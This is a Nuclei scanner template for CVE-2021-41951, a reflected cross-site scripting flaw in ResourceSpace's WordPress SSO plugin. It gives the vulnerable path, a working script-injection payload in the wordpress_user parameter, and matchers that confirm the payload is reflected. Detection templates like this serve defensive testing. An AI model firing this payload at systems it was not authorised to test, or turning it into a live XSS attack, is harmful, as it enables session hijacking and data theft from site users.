id: CVE-2021-41951

info:
  name: Resourcespace - Cross-Site Scripting
  author: coldfish
  severity: medium
  description: ResourceSpace before 9.6 rev 18290 is affected by a reflected cross-site scripting vulnerability in plugins/wordpress_sso/pages/index.php via the wordpress_user parameter.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    To remediate this issue, it is recommended to implement proper input validation and sanitization techniques to prevent the execution of malicious scripts.
  reference:
    - https://www.horizon3.ai/multiple-vulnerabilities-in-resourcespace/
    - https://nvd.nist.gov/vuln/detail/CVE-2021-41951
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ARPSyndicate/kenzer-templates
    - https://github.com/nvn1729/advisories
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-41951
    cwe-id: CWE-79
    epss-score: 0.55022
    epss-percentile: 0.97907
    cpe: cpe:2.3:a:montala:resourcespace:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: montala
    product: resourcespace
  tags: cve2021,cve,xss,resourcespace,montala,vkev

http:
  - method: GET
    path:
      - '{{BaseURL}}/plugins/wordpress_sso/pages/index.php?wordpress_user=%3Cscript%3Ealert(1)%3C/script%3E'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "TEST<script>alert(1)</script>"

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
# digest: 4a0a00473045022031eed52ef2f412cffe1b507c68fe016ffa1ae1e5f345f9d8a5377f16dca0b9a6022100a66184d223ec71722d1742c3034bd866294e6bc8992d4b83fd1cb6ec1fbb0302:922c64590222798bb761d5b6d8e72950